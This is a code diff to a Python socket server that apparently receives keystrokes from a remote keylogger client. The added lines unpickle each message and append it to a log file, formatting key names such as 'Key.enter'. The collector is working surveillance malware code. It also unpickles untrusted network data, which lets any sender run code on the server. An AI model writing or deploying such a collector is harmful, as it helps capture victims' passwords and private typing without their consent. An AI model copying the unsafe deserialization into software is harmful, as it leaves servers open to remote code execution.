@@ -18,9 +18,20 @@ try:
     client_socket, client_address = server_socket.accept()
     print("Outbound connection received.")
     print("Client socket:{0}:{1}".format(client_socket, client_address))
+    incoming_data = open("incoming.txt", "a")
 
     while True:
         received_data = pickle.loads(client_socket.recv(1024))
+        
+        writeable_data = str(received_data)
+        if writeable_data[:3] == "Key":
+            incoming_data.write(" " + writeable_data + " ")
+            if writeable_data == "Key.enter":
+                incoming_data.write("\n")
+        else:
+            incoming_data.write(writeable_data.strip("'"))
+        
         print("Received data:{0}".format(received_data))
 finally:
     server_socket.close()
+    incoming_data.close()
